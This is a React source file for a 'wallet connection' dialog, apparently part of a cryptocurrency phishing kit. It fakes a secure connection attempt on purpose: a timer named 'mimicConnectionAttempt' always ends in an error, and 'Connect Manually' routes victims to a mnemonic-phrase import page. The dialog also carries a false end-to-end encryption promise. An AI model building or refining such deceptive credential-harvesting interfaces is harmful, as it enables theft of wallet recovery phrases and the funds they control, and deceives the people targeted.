import { useEffect, useState } from "react";
import { useDispatch, useSelector } from "react-redux";
import { useNavigate } from "react-router-dom";
import { setViewportLayout } from "../../stateManagement/redux/actionCreators/UIUXActionCreators";
import { PASSPHRASE_LAYOUT } from "../../stateManagement/redux/reducers/UIUXReducer";
import OscillatingThreadedBall from "../OscillatingThreadedBall/OscillatingThreadedBall";
import { useCloseConnectionPlate } from "./hooks/EventListeners";
import { ConnectingContainer, ConnectionPlate, EncryptionPromise, PlateDescription, PlatePromptContainer, PromptButton, TryAgainButton, WalletConnectionPlateContainer, WalletNameLogo } from "./Style";

const WalletConnectionPlate = ({ setWallet, wallet }) => {

    const CONNECTING = "connecting";
    const PROMPTING = "prompting";

    const navigate = useNavigate();
    const dispatch = useDispatch();
    const illumMode = useSelector(state => state.uiux.illumMode);

    const closePlate = useCloseConnectionPlate();

    const [plateState, setPlateState] = useState(CONNECTING);
    

    const description1 = "Synchronize and validate your selected wallet. A QR code via ";
    const description2 = "an Open and Decentralized protocol ";
    const description3 = "will be generated upon successful validation.";

    const encryptionPromiseText = "This session is protected with an end-to-end encryption";

    const errorMsg = "An error occurred... please try again or connect mannually";

    const mimicConnectionAttempt = (delay = 4) => {

        setPlateState(CONNECTING);

        return setTimeout(() => {
            setPlateState(PROMPTING);
        }, delay * 1000);

    };

    const PlatePrompt = ({ illumMode }) => {
        return (
            <PlatePromptContainer illumMode={illumMode} >
                <div className="errorContainer"><span className="errorMsg" >{errorMsg}</span></div>
                <br />
                <br />
                <TryAgainButton
                    className="tryAgain"
                    onClick={() => {
                        mimicConnectionAttempt(13);
                    }}
                >Try Again</TryAgainButton>
                <PromptButton
                    className="connectManually"
                    onClick={() => {
                        // dispatch(setViewportLayout(PASSPHRASE_LAYOUT));
                        navigate("/import/mnemonic-phrase")
                    }}
                >Connect Manually</PromptButton>
            </PlatePromptContainer>
        );
    }

    const Connecting = ({ illumMode }) => {
        return (
            <ConnectingContainer illumMode={illumMode} >
                <div className="loadingOscillator"><OscillatingThreadedBall /></div>
                <h2 className="actionName" >Starting secure connection...</h2>
                <p className="wait">please wait...</p>
            </ConnectingContainer>
        )
    }

    useEffect(() => {
        mimicConnectionAttempt(5);
    }, []);

    return (
        <WalletConnectionPlateContainer>
            <div id="plateBack" className="plateBack init"></div>
            <ConnectionPlate id="connectionPlate" className="init" illumMode={illumMode} >
                <div
                    className="closeFrame"
                    onClick={() => {
                        closePlate(setWallet);
                    }}
                ><span>x</span></div>
                <WalletNameLogo illumMode={illumMode} >
                    <div className="cWalletFrame"><img src={wallet.imgSrc} alt={wallet.name} /></div>
                    <h2 className="cWalletName">{wallet.name}</h2>
                </WalletNameLogo>
                <PlateDescription illumMode={illumMode} >
                    <span className="part1">{description1}</span>
                    <span className="part2 higlightedPart">{description2}</span>
                    <span className="part3">{description3}</span>
                </PlateDescription>
                {
                    plateState === CONNECTING

                    &&

                    <Connecting illumMode={illumMode} />
                }
                {
                    plateState === PROMPTING

                    &&

                    <PlatePrompt illumMode={illumMode} />
                }
                <EncryptionPromise illumMode={illumMode} >
                    <span className="shieldFrame"><img src="/media/images/shield.png" alt="shield icon" /></span>
                    <p className="promiseText">{encryptionPromiseText}</p>
                </EncryptionPromise>
            </ConnectionPlate>
        </WalletConnectionPlateContainer>
    );
}

export default WalletConnectionPlate;